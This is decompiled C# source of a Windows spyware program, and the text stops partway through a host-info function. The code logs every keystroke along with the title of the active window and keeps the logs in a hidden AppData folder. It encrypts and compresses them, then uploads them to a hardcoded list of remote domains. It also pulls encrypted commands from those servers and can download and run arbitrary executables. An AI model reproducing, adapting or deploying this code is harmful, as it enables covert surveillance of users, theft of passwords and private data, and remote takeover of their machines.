using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Xml.Linq;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using windows_proc.My;
using windows_proc.My.Resources;

namespace windows_proc;

[StandardModule]
internal sealed class Module1
{
	public class keyLogger
	{
		private XElement xmlEkeys;

		private long xmlEkeysSize;

		private XElement xmlEkeysChild;

		private KeysConverter k;

		private int key;

		public bool con;

		[AccessedThroughProperty("Timer1")]
		private Timer _Timer1;

		private object lastSpecKey;

		private bool busy;

		private int elCo;

		private StreamWriter file_temp;

		private string current_file_name;

		private virtual Timer Timer1
		{
			get
			{
				return _Timer1;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				_Timer1 = value;
			}
		}

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int GetAsyncKeyState(int vKey);

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern IntPtr GetForegroundWindow();

		[DllImport("user32", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int cch);

		public keyLogger()
		{
			//IL_0011: Unknown result type (might be due to invalid IL or missing references)
			//IL_001b: Expected O, but got Unknown
			//IL_0032: Unknown result type (might be due to invalid IL or missing references)
			//IL_003c: Expected O, but got Unknown
			//IL_0044: Unknown result type (might be due to invalid IL or missing references)
			//IL_004e: Expected O, but got Unknown
			xmlEkeys = new XElement(XName.op_Implicit("content"));
			xmlEkeysSize = 0L;
			xmlEkeysChild = null;
			k = new KeysConverter();
			con = true;
			Timer1 = new Timer();
			lastSpecKey = false;
			busy = false;
			elCo = 0;
			current_file_name = "";
			bufferInit();
			Timer1.set_Interval(1);
			Timer1.set_Enabled(true);
			Timer1.add_Tick((EventHandler)Timer1_Tick);
			Timer1.Start();
		}

		public void output()
		{
			Console.WriteLine(((XNode)xmlEkeys).ToString());
		}

		public void bufferInit(bool background = false)
		{
			//IL_0090: Unknown result type (might be due to invalid IL or missing references)
			//IL_009a: Expected O, but got Unknown
			//IL_00a4: Unknown result type (might be due to invalid IL or missing references)
			//IL_00ab: Expected O, but got Unknown
			if (background)
			{
				conState.balance();
				string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\upflder\\", "*.temp");
				string[] array = files;
				foreach (string text in array)
				{
					if (Operators.CompareString(text, current_file_name, false) == 0)
					{
						continue;
					}
					try
					{
						string text2 = File.ReadAllText(text);
						if (text2.Length >= 2)
						{
							XElement val = XElement.Parse("<bufferTemp>" + text2 + "</bufferTemp>");
							((XContainer)val).Add((object)new XElement(XName.op_Implicit("startup"), (object)"i am"));
							XElement val2 = new XElement(XName.op_Implicit("blackBox"));
							((XContainer)val2).Add((object)val);
							((XContainer)val2).Add((object)curHost.getData());
							secure secure = new secure();
							secure.prepareForUpload(val2);
						}
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					try
					{
						File.Delete(text);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
			}
			else
			{
				conState.balance();
				string path = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\upflder\\"), controlState.RandomString(10)), (object)".temp"));
				while (File.Exists(path))
				{
					path = Conversions.ToString(Operators.ConcatenateObject(controlState.RandomString(20), (object)".temp"));
				}
				current_file_name = path;
				file_temp = new StreamWriter(path);
				file_temp.Write("");
				file_temp.Flush();
			}
		}

		public void timeout()
		{
			Console.WriteLine("timeout ********************");
		}

		public long keySize(bool complete = false)
		{
			//IL_0090: Unknown result type (might be due to invalid IL or missing references)
			//IL_009a: Expected O, but got Unknown
			checked
			{
				try
				{
					if (complete)
					{
						int num = 1;
						while (busy)
						{
							NewLateBinding.LateCall((object)null, typeof(Thread), "Sleep", new object[1] { Operators.DivideObject(controlState.backgroundWaitTime, (object)3) }, (string[])null, (Type[])null, (bool[])null, true);
							num++;
							if (num > 100)
							{
								busy = false;
							}
						}
						busy = true;
						if (xmlEkeysChild.get_Value().Length > 7)
						{
							((XContainer)xmlEkeys).Add((object)xmlEkeysChild);
						}
						xmlEkeysChild = new XElement(XName.op_Implicit("app"));
						busy = false;
					}
					if (!busy & (((XContainer)xmlEkeys).Descendants(XName.op_Implicit("app")).Count() > 0))
					{
						file_temp.Write(((XNode)xmlEkeys).ToString().Replace("<content>", "").Replace("</content>", ""));
						elCo += ((XContainer)xmlEkeys).Descendants(XName.op_Implicit("app")).Count();
						xmlEkeys.RemoveAll();
						file_temp.Flush();
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				return xmlEkeysSize;
			}
		}

		public int countElement()
		{
			return elCo;
		}

		private void Timer1_Tick(object sender, EventArgs e)
		{
			int num = 1;
			do
			{
				key = 0;
				key = GetAsyncKeyState(num);
				if (key == -32767)
				{
					if (!con)
					{
						break;
					}
					string caption = GetCaption();
					string text = ((TypeConverter)(object)k).ConvertToString((object?)num);
					if (text.Length == 1)
					{
						lastSpecKey = false;
						if (Control.IsKeyLocked((Keys)20))
						{
							writeKeyXml(caption, text.ToUpper());
						}
						else
						{
							writeKeyXml(caption, text.ToLower());
						}
					}
					else if (Operators.ConditionalCompareObjectEqual(lastSpecKey, (object)false, false))
					{
						if (Operators.CompareString(text.ToUpper(), "LBUTTON", false) == 0)
						{
							lastSpecKey = true;
						}
						writeKeyXml(caption, "[" + text.ToUpper() + "]");
					}
				}
				num = checked(num + 1);
			}
			while (num <= 255);
		}

		public void writeKeyXml(string appTitle, string Key)
		{
			//IL_0109: Unknown result type (might be due to invalid IL or missing references)
			//IL_0113: Expected O, but got Unknown
			//IL_01b8: Unknown result type (might be due to invalid IL or missing references)
			//IL_01c2: Expected O, but got Unknown
			int num = 1;
			checked
			{
				while (busy)
				{
					NewLateBinding.LateCall((object)null, typeof(Thread), "Sleep", new object[1] { Operators.DivideObject(controlState.backgroundWaitTime, (object)3) }, (string[])null, (Type[])null, (bool[])null, true);
					num++;
					if (num > 100)
					{
						busy = false;
					}
				}
				string text = "app";
				xmlEkeysSize += Key.Length;
				if (!Information.IsNothing((object)xmlEkeysChild))
				{
					if (xmlEkeysChild.get_HasAttributes())
					{
						if (Operators.CompareString(xmlEkeysChild.Attribute(XName.op_Implicit("currentApp")).get_Value(), appTitle, false) == 0)
						{
							xmlEkeysChild.set_Value(xmlEkeysChild.get_Value() + Key);
						}
						else
						{
							busy = true;
							if (xmlEkeysChild.get_Value().Length > 7)
							{
								((XContainer)xmlEkeys).Add((object)xmlEkeysChild);
							}
							busy = false;
							xmlEkeysChild = new XElement(XName.op_Implicit(text));
							xmlEkeysChild.SetAttributeValue(XName.op_Implicit("currentApp"), (object)appTitle);
							xmlEkeysChild.set_Value(Key);
							xmlEkeysChild.SetAttributeValue(XName.op_Implicit("time"), (object)DateTime.Now.ToString());
							if (Conversions.ToBoolean(controlState.debug))
							{
								Console.WriteLine("-----------------------------start main-------------------------------");
								Console.WriteLine(((XNode)xmlEkeys).ToString());
								Console.WriteLine("-----------------------------end main-------------------------------");
							}
						}
					}
					else
					{
						xmlEkeysChild.SetAttributeValue(XName.op_Implicit("currentApp"), (object)appTitle);
						xmlEkeysChild.set_Value(Key);
					}
				}
				else
				{
					xmlEkeysChild = new XElement(XName.op_Implicit(text));
					xmlEkeysChild.SetAttributeValue(XName.op_Implicit("currentApp"), (object)appTitle);
					xmlEkeysChild.set_Value(Key);
					xmlEkeysChild.SetAttributeValue(XName.op_Implicit("time"), (object)DateTime.Now.ToString());
				}
				if (Conversions.ToBoolean(controlState.debug))
				{
					Console.WriteLine("-----------------------------start child-------------------------------");
					Console.WriteLine(((XNode)xmlEkeysChild).ToString());
					Console.WriteLine("-----------------------------end child-------------------------------");
				}
			}
		}

		public XElement rotate()
		{
			keySize(complete: true);
			try
			{
				file_temp.Close();
				XElement result = XElement.Parse("<bufferTemp>" + File.ReadAllText(current_file_name) + "</bufferTemp>");
				busy = true;
				File.Delete(current_file_name);
				bufferInit();
				busy = false;
				elCo = 0;
				xmlEkeysSize = 0L;
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				XElement result = null;
				ProjectData.ClearProjectError();
				return result;
			}
		}

		private string GetCaption()
		{
			StringBuilder stringBuilder = new StringBuilder(256);
			IntPtr foregroundWindow = GetForegroundWindow();
			GetWindowText(foregroundWindow, stringBuilder, stringBuilder.Capacity);
			return stringBuilder.ToString();
		}
	}

	public class controlState
	{
		private Random rand;

		private object netCount;

		private object isHostCon;

		private Ping pn;

		private object pingingHost;

		private object server;

		private WebRequest objWebReq;

		private WebResponse objResp;

		public static long uploadWaitTime = 1800000L;

		public static object backgroundWaitTime = 1000;

		public static object monitorWaitTIme = 60000;

		public static object keySize = 4000;

		public static object debug = false;

		public static object writingBusy = false;

		[SpecialName]
		private static Random _0024STATIC_0024RandomString_0024011C8_0024r;

		[SpecialName]
		private static StaticLocalInitFlag _0024STATIC_0024RandomString_0024011C8_0024r_0024Init = new StaticLocalInitFlag();

		[SpecialName]
		private static Random _0024STATIC_0024GetRandom_002402888_0024Generator;

		[SpecialName]
		private static StaticLocalInitFlag _0024STATIC_0024GetRandom_002402888_0024Generator_0024Init = new StaticLocalInitFlag();

		public controlState()
		{
			rand = new Random();
			netCount = 10;
			isHostCon = true;
			pn = new Ping();
			pingingHost = "http://google.com,http://microsoft.com,http://facebook.com,http://yahoo.com,http://twitter.com";
			server = "http://kayumba.us.to,http://kayumbaamback.us.to,http://kayumbaambackagain.us.to,http://asdfghjklasdfghjk.info,http://qwertyuiopqwertyuiop.net,http://kayumbaforthelasttime.net";
		}

		public void debuging()
		{
			uploadWaitTime = 5000L;
			keySize = 40;
			pingingHost = "http://localhost,http://localhost";
			server = "http://localhost,http://localhost1";
			Console.WriteLine("debuging");
		}

		public void local()
		{
			pingingHost = "http://localhost,http://localhost";
			server = "http://localhost,http://localhost1";
			Console.WriteLine("local");
		}

		public void balance()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\upflder";
			if (!Directory.Exists(path))
			{
				Directory.CreateDirectory(path).Attributes = FileAttributes.Hidden;
			}
		}

		public bool state()
		{
			return Conversions.ToBoolean(isHostCon);
		}

		public Collection validServerUrl()
		{
			//IL_0008: Unknown result type (might be due to invalid IL or missing references)
			//IL_000e: Expected O, but got Unknown
			WebClient webClient = new WebClient();
			int num = 0;
			Collection val = new Collection();
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = ((IEnumerable)NewLateBinding.LateGet(server, (Type)null, "Split", new object[1] { "," }, (string[])null, (Type[])null, (bool[])null)).GetEnumerator();
				while (enumerator.MoveNext())
				{
					object objectValue = RuntimeHelpers.GetObjectValue(enumerator.Current);
					num = rand.Next(100, 10000);
					try
					{
						Thread.Sleep(100);
						object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet((object)webClient, (Type)null, "DownloadString", new object[1] { Operators.ConcatenateObject(Operators.ConcatenateObject(objectValue, (object)"?token=true&cache="), (object)num) }, (string[])null, (Type[])null, (bool[])null));
						Console.WriteLine(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"available ", objectValue), (object)"?token=true&cache="), (object)num));
						if (Conversions.ToBoolean(secure.validToken(Conversions.ToString(objectValue2))))
						{
							Console.WriteLine(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"valid token ", objectValue), (object)"?token=true&cache="), (object)num));
							val.Add(RuntimeHelpers.GetObjectValue(objectValue), (string)null, (object)null, (object)null);
						}
						else
						{
							Thread.Sleep(100);
							Console.WriteLine(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"invalid token ", objectValue), (object)"?token=true&cache="), (object)num));
						}
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				return val;
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		public bool isHostConnected()
		{
			if (((ServerComputer)MyProject.Computer).get_Network().get_IsAvailable())
			{
				if (Operators.ConditionalCompareObjectGreaterEqual(netCount, (object)10, false))
				{
					netCount = 0;
					string[] array = pingingHost.ToString()!.Split(new char[1] { ',' });
					string requestUriString = array.ElementAt(GetRandom(0, array.Length));
					objWebReq = WebRequest.Create(requestUriString);
					objWebReq.Proxy = null;
					try
					{
						Type typeFromHandle = typeof(Thread);
						object[] array2 = new object[1] { RuntimeHelpers.GetObjectValue(backgroundWaitTime) };
						bool[] array3 = new bool[1] { true };
						NewLateBinding.LateCall((object)null, typeFromHandle, "Sleep", array2, (string[])null, (Type[])null, array3, true);
						if (array3[0])
						{
							backgroundWaitTime = RuntimeHelpers.GetObjectValue(array2[0]);
						}
						objResp = objWebReq.GetResponse();
						objResp.Close();
						objWebReq = null;
						isHostCon = true;
						return true;
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						isHostCon = false;
						objWebReq = null;
						bool result = false;
						ProjectData.ClearProjectError();
						return result;
					}
				}
				netCount = Operators.AddObject(netCount, (object)1);
				Console.WriteLine(Operators.ConcatenateObject((object)"count", netCount));
				return Conversions.ToBoolean(isHostCon);
			}
			netCount = 10;
			isHostCon = false;
			return false;
		}

		public static int GetRandom(int Min, int Max)
		{
			//IL_003f: Unknown result type (might be due to invalid IL or missing references)
			bool lockTaken = false;
			try
			{
				Monitor.Enter(_0024STATIC_0024GetRandom_002402888_0024Generator_0024Init, ref lockTaken);
				if (_0024STATIC_0024GetRandom_002402888_0024Generator_0024Init.State == 0)
				{
					_0024STATIC_0024GetRandom_002402888_0024Generator_0024Init.State = 2;
					_0024STATIC_0024GetRandom_002402888_0024Generator = new Random();
				}
				else if (_0024STATIC_0024GetRandom_002402888_0024Generator_0024Init.State == 2)
				{
					throw new IncompleteInitialization();
				}
			}
			finally
			{
				_0024STATIC_0024GetRandom_002402888_0024Generator_0024Init.State = 1;
				if (lockTaken)
				{
					Monitor.Exit(_0024STATIC_0024GetRandom_002402888_0024Generator_0024Init);
				}
			}
			return _0024STATIC_0024GetRandom_002402888_0024Generator.Next(Min, Max);
		}

		public static object RandomString(int len)
		{
			//IL_0046: Unknown result type (might be due to invalid IL or missing references)
			string text = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
			bool lockTaken = false;
			try
			{
				Monitor.Enter(_0024STATIC_0024RandomString_0024011C8_0024r_0024Init, ref lockTaken);
				if (_0024STATIC_0024RandomString_0024011C8_0024r_0024Init.State == 0)
				{
					_0024STATIC_0024RandomString_0024011C8_0024r_0024Init.State = 2;
					_0024STATIC_0024RandomString_0024011C8_0024r = new Random();
				}
				else if (_0024STATIC_0024RandomString_0024011C8_0024r_0024Init.State == 2)
				{
					throw new IncompleteInitialization();
				}
			}
			finally
			{
				_0024STATIC_0024RandomString_0024011C8_0024r_0024Init.State = 1;
				if (lockTaken)
				{
					Monitor.Exit(_0024STATIC_0024RandomString_0024011C8_0024r_0024Init);
				}
			}
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 1; i <= len; i = checked(i + 1))
			{
				int startIndex = _0024STATIC_0024RandomString_0024011C8_0024r.Next(0, text.Length);
				stringBuilder.Append(text.Substring(startIndex, 1));
			}
			return stringBuilder.ToString();
		}

		public static long getTimeStamp()
		{
			try
			{
				DateTime utcNow = DateTime.UtcNow;
				DateTime value = new DateTime(1970, 1, 1);
				return checked((long)Math.Round(utcNow.Subtract(value).TotalMilliseconds));
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				Console.WriteLine("0x999800");
				long result = 0L;
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public static long getTimeStampDate(DateTime dt)
		{
			try
			{
				DateTime value = new DateTime(1970, 1, 1);
				return checked((long)Math.Round(dt.Subtract(value).TotalMilliseconds));
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				long result = 0L;
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public static long getTimeStamp(int addDays)
		{
			try
			{
				DateTime dateTime = DateTime.UtcNow.AddDays(addDays);
				DateTime value = new DateTime(1970, 1, 1);
				return checked((long)Math.Round(dateTime.Subtract(value).TotalMilliseconds));
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				Console.WriteLine("0x999900");
				long result = 0L;
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	public class networkUpload
	{
		public network net;

		public bool discard;

		private int iC;

		public networkUpload()
		{
			net = default(network);
			discard = false;
			iC = 0;
			net.FILE_NAME = "";
			net.server = conState.validServerUrl();
		}

		public void upload(string file)
		{
			checked
			{
				iC++;
				if (iC > 5)
				{
					discard = true;
					iC = 0;
					return;
				}
				if (!Information.IsNothing((object)net.server) & (net.server.get_Count() > 0))
				{
					IEnumerator enumerator = default(IEnumerator);
					try
					{
						enumerator = net.server.GetEnumerator();
						while (enumerator.MoveNext())
						{
							string url = Conversions.ToString(enumerator.Current);
							net.statusCode = 0;
							net.FILE_NAME = file;
							if (!uploadFile(url))
							{
								uploadFile(url);
							}
						}
					}
					finally
					{
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
					clean();
				}
				else
				{
					net.server = conState.validServerUrl();
				}
				Console.WriteLine("sent for upload");
			}
		}

		public void clean()
		{
			try
			{
				File.Delete(net.FILE_NAME);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				Console.WriteLine("0x999910");
				ProjectData.ClearProjectError();
			}
		}

		public object ready()
		{
			return net.ready;
		}

		private bool uploadFile(string url)
		{
			try
			{
				if (!((net.statusCode != 0) | (net.FILE_NAME.Length < 1)))
				{
					WebClient webClient = new WebClient();
					byte[] bytes = webClient.UploadFile(new Uri(url), net.FILE_NAME);
					try
					{
						string @string = Encoding.ASCII.GetString(bytes);
						if (Operators.CompareString(@string, "gotyou", false) == 0)
						{
							return true;
						}
						return false;
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception ex2 = ex;
						if (Conversions.ToBoolean(controlState.debug))
						{
							Console.WriteLine(ex2.Message + "0x999930");
						}
						bool result = false;
						ProjectData.ClearProjectError();
						return result;
					}
				}
				return false;
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3);
				Exception ex4 = ex3;
				if (Conversions.ToBoolean(controlState.debug))
				{
					Console.WriteLine(ex4.Message + "0x999920");
				}
				bool result = false;
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	public struct network
	{
		public string FILE_NAME;

		public int statusCode;

		public bool ready;

		public Collection server;
	}

	public class networkDownload
	{
		private network net;

		public networkDownload()
		{
			net = default(network);
		}

		public XElement downloadString()
		{
			WebClient webClient = new WebClient();
			new secure();
			CurrentHost currentHost = new CurrentHost();
			net.server = conState.validServerUrl();
			if (!Information.IsNothing((object)net.server))
			{
				IEnumerator enumerator = default(IEnumerator);
				try
				{
					enumerator = net.server.GetEnumerator();
					while (enumerator.MoveNext())
					{
						string text = Conversions.ToString(enumerator.Current);
						try
						{
							string text2 = webClient.DownloadString(new Uri(text + "?link=" + currentHost.getHostLink()));
							if (text2.Length <= 5)
							{
								continue;
							}
							try
							{
								string text3 = "";
								text3 = ((!Operators.ConditionalCompareObjectEqual(controlState.debug, (object)false, false)) ? text2 : secure.AES_Decrypt(text2, currentHost.getHostIdentity()));
								Console.WriteLine("download  " + text3);
								if (!Information.IsNothing((object)text3))
								{
									return XElement.Parse(text3);
								}
							}
							catch (Exception projectError)
							{
								ProjectData.SetProjectError(projectError);
								Console.WriteLine("");
								ProjectData.ClearProjectError();
							}
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							Console.WriteLine("0x999940");
							ProjectData.ClearProjectError();
						}
					}
				}
				finally
				{
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			return null;
		}

		public bool downloadFileExe(string url, string command)
		{
			WebClient webClient = new WebClient();
			string temp = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp();
			object obj = Operators.ConcatenateObject(Operators.ConcatenateObject((object)(temp + "\\"), controlState.RandomString(20)), (object)".exe");
			while (File.Exists(Conversions.ToString(obj)))
			{
				obj = Operators.ConcatenateObject(Operators.ConcatenateObject((object)(temp + "\\"), controlState.RandomString(20)), (object)".exe");
			}
			try
			{
				webClient.DownloadFile(new Uri(url), Conversions.ToString(obj));
				try
				{
					if (File.Exists(Conversions.ToString(obj)))
					{
						Process.Start(Conversions.ToString(obj), command);
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				return true;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				Console.WriteLine("0x999950");
				bool result = false;
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	public class secure
	{
		private object dataFolder;

		public secure()
		{
			dataFolder = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\upflder";
			if (!Directory.Exists(Conversions.ToString(dataFolder)))
			{
				Directory.CreateDirectory(Conversions.ToString(dataFolder)).Attributes = FileAttributes.NotContentIndexed;
			}
		}

		public object prepareForUpload(XElement data)
		{
			controlState.writingBusy = true;
			try
			{
				string path = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(dataFolder, (object)"\\"), controlState.RandomString(20)), (object)".dll"));
				while (File.Exists(path))
				{
					path = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(dataFolder, (object)"\\"), controlState.RandomString(20)), (object)".dll"));
				}
				StreamWriter streamWriter = new StreamWriter(path, append: false);
				string text = "";
				text = ((!Conversions.ToBoolean(controlState.debug)) ? encryptToXml(data) : ((XNode)data).ToString());
				if (text.Length > 3)
				{
					try
					{
						if (Operators.ConditionalCompareObjectEqual(controlState.debug, (object)false, false))
						{
							text = Zip(text);
						}
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					streamWriter.Write(text);
					streamWriter.Close();
					controlState.writingBusy = false;
					return true;
				}
				controlState.writingBusy = false;
				return false;
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				controlState.writingBusy = false;
				Console.WriteLine("0x999970");
				Console.Write(ex2.Message);
				object result = false;
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public static string Zip(string text)
		{
			byte[] bytes = Encoding.Unicode.GetBytes(text);
			MemoryStream memoryStream = new MemoryStream();
			using (GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Compress, leaveOpen: true))
			{
				gZipStream.Write(bytes, 0, bytes.Length);
			}
			memoryStream.Position = 0L;
			new MemoryStream();
			checked
			{
				byte[] array = new byte[(int)(memoryStream.Length - 1L) + 1];
				memoryStream.Read(array, 0, array.Length);
				byte[] array2 = new byte[array.Length + 3 + 1];
				Buffer.BlockCopy(array, 0, array2, 4, array.Length);
				Buffer.BlockCopy(BitConverter.GetBytes(bytes.Length), 0, array2, 0, 4);
				return Convert.ToBase64String(array2);
			}
		}

		public string encryptToXml(XElement data)
		{
			//IL_0017: Unknown result type (might be due to invalid IL or missing references)
			//IL_001d: Expected O, but got Unknown
			//IL_006d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0077: Expected O, but got Unknown
			//IL_0088: Unknown result type (might be due to invalid IL or missing references)
			//IL_0092: Expected O, but got Unknown
			try
			{
				object objectValue = RuntimeHelpers.GetObjectValue(controlState.RandomString(50));
				XElement val = new XElement(XName.op_Implicit("encrypted"));
				string text = encryptStringWithKey(Resources.publicKey, Conversions.ToString(objectValue));
				object obj = AES_Encrypt(((XNode)data).ToString(), Conversions.ToString(objectValue));
				if (Information.IsNothing(RuntimeHelpers.GetObjectValue(obj)) | Information.IsNothing((object)text))
				{
					return "";
				}
				((XContainer)val).Add((object)new XElement(XName.op_Implicit("password"), (object)text));
				((XContainer)val).Add((object)new XElement(XName.op_Implicit("content"), RuntimeHelpers.GetObjectValue(obj)));
				return ((XNode)val).ToString();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				Console.WriteLine("0x900000");
				string result = "";
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public string AES_Encrypt(string input, string pass)
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
			string text = "";
			try
			{
				byte[] array = new byte[32];
				byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(pass));
				Array.Copy(sourceArray, 0, array, 0, 16);
				Array.Copy(sourceArray, 0, array, 15, 16);
				rijndaelManaged.Key = array;
				rijndaelManaged.Mode = CipherMode.ECB;
				ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor();
				byte[] bytes = Encoding.ASCII.GetBytes(input);
				return Convert.ToBase64String(cryptoTransform.TransformFinalBlock(bytes, 0, bytes.Length));
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				Console.WriteLine("0x910000");
				string result = null;
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public static string AES_Decrypt(string input, string pass)
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
			string text = "";
			try
			{
				byte[] array = new byte[32];
				byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(pass));
				Array.Copy(sourceArray, 0, array, 0, 16);
				Array.Copy(sourceArray, 0, array, 15, 16);
				rijndaelManaged.Key = array;
				rijndaelManaged.Mode = CipherMode.ECB;
				ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
				byte[] array2 = Convert.FromBase64String(input);
				return Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array2, 0, array2.Length));
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				string result = Conversions.ToString(false);
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public string encryptStringWithKey(string publicXml, string value)
		{
			try
			{
				byte[] bytes = Encoding.ASCII.GetBytes(value);
				RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider();
				rSACryptoServiceProvider.FromXmlString(publicXml);
				byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: false);
				return Convert.ToBase64String(inArray);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				Console.WriteLine("0x920000");
				string result = null;
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public object DecryptStringWithKey(string privateXml, string value)
		{
			try
			{
				RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider();
				rSACryptoServiceProvider.FromXmlString(privateXml);
				byte[] bytes = rSACryptoServiceProvider.Decrypt(Convert.FromBase64String(value), fOAEP: false);
				return Encoding.Default.GetString(bytes);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				Console.WriteLine("0x930000");
				object result = "";
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public static object validToken(string token)
		{
			try
			{
				string value = AES_Decrypt(token, "theblackbox");
				if (Convert.ToInt64(value) > controlState.getTimeStamp(-8))
				{
					return true;
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			if (Conversions.ToBoolean(controlState.debug))
			{
				Console.WriteLine("invalid token");
			}
			return false;
		}
	}

	public class CurrentHost
	{
		private object inffectedDirSignature;

		private XElement hostSigantureXml;

		public CurrentHost()
		{
			//IL_0083: Unknown result type (might be due to invalid IL or missing references)
			//IL_008d: Expected O, but got Unknown
			inffectedDirSignature = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\WinSySConfigToken.ini";
			hostSigantureXml = null;
			if (!File.Exists(Conversions.ToString(inffectedDirSignature)))
			{
				return;
			}
			try
			{
				hostSigantureXml = XElement.Parse(File.ReadAllText(Conversions.ToString(inffectedDirSignature)));
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				Console.WriteLine("0x940000");
				ProjectData.ClearProjectError();
			}
			try
			{
				if (Information.IsNothing((object)hostSigantureXml))
				{
					hostSigantureXml = new XElement(XName.op_Implicit("windows"));
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				Console.WriteLine("0x950000");
				ProjectData.ClearProjectError();
			}
		}

		private string getMacAddress()
		{
			NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
			return allNetworkInterfaces[0].GetPhysicalAddress().ToString();
		}

		public XElement getHostInfo()
		{
			//IL_000a: Unknown result type (might be due to invalid IL or missing references)
			//IL_0011: Expected O, but got Unknown
			//IL_00e5: Unknown result type (might be due to invalid IL or missing references)
			//IL_00ec: Expected O, but got Unknown
			XElement val = new XElement(XName.op_Implicit("SystemInfo"));
